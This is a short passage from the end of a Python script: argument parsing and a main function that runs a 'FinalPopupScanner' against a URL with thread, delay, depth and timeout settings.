    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    scanner = FinalPopupScanner(
        args.url,
        args.threads,
        args.delay,
        args.depth,
        args.timeout
    )
    
    scanner.scan()

if __name__ == "__main__":
    main()